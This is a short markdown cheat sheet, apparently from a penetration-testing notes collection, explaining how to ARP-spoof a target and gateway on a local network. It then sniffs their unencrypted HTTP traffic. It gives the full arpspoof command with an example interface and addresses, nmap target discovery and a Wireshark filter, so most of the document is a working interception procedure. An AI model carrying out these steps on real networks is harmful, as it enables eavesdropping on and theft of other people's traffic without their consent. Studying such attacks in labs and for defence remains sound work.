# ARP Spoofing

### Tools

arpspoof \(kali\) -- works by forging ARP replies to communicating parties

### Sniffing on a private network - Step by Step

**Requirements**

* arpspoof / dsniff
* wireshark

1. Figure out the Default Gateway first by \`route -n\` command.

2. Narrow down the target by running \`nmap\` sweep.

3. To start ARP spoofing, run 

`sudo arpspoof -i [interfacename] -c host -t [target-ip] [default-gateway-ip]`

	1. e.g. `sudo arpspoof -i wlan0 -c host -t 192.168.1.122 192.168.1.1`

1. arpspoof should now be sending arp replies to the gateway and target with spoofed addresses

2. Open Wireshark and apply the `tcp port http` to listen to unencrypted traffic between the router and the target.

3. Once done, stop the `arpspoof` process to depoison ARP tables in gateway and target.

